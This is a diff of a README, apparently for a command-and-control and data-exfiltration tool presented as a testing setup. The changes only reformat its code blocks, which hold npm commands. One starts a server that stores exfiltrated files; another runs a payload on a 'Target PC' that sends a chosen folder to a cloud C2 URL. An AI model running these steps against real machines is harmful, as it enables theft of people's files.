@@ -54,7 +54,9 @@ Follow these instructions to safely deploy and evaluate the C2 ecosystem. Ensure
 
 Open a terminal and start the C2 server using our NPM script:
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   npm run start:server   `
+  `
+  npm run start:server   
+  `
 
 _The server will start on port 3000 and automatically create a /received-data directory to store incoming exfiltrated files._
 
@@ -69,7 +71,9 @@ This method runs both the C2 server and the payload on the exact same machine.
 2.  Execute the payload, pointing it to your local server:
     
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   npm run start:payload -- --url=http://localhost:3000   `
+`
+npm run start:payload -- --url=http://localhost:3000 
+`  
 
 _(To target a specific folder during testing, append the path flag: npm run start:payload -- --url=http://localhost:3000 --path=/path/to/your/dataset)_
 
@@ -89,8 +93,9 @@ This method demonstrates real-world remote exfiltration without requiring any th
     
 6.  **On the Target PC**, open a terminal and run the payload, pointing it to your cloud C2 server:
     
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   npm run start:payload -- --url=[https://your-app-name.github.dev](https://your-app-name.github.dev)   `
+`
+ npm run start:payload -- --url=[https://your-app-name.github.dev](https://your-app-name.github.dev) 
+ `
 
 📦 Output Expectations
 ----------------------
